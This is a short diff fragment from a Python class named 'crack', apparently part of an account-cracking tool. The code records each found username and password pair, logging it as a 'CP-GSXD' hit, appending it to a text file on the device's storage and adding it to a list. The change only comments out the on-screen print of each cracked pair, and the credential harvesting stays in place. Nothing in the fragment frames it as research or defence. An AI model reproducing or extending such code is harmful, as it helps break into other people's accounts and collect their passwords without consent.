@@ -973,7 +973,7 @@ class crack:
                                 used=user
                     if len(used)<11 or len(used)>15:
                         used = user
-                    print(f"\r{EE}[CP-GSXD] {used} | {pw} {VV}    ")
+                    #print(f"\r{EE#}[CP-GSXD] {used} | {pw} {VV}    ")
                     open("/sdcard/GSXD_CP.txt", "a").write(used + "|" + pw + "\n")
                     cp.append(used + pw)
                     break
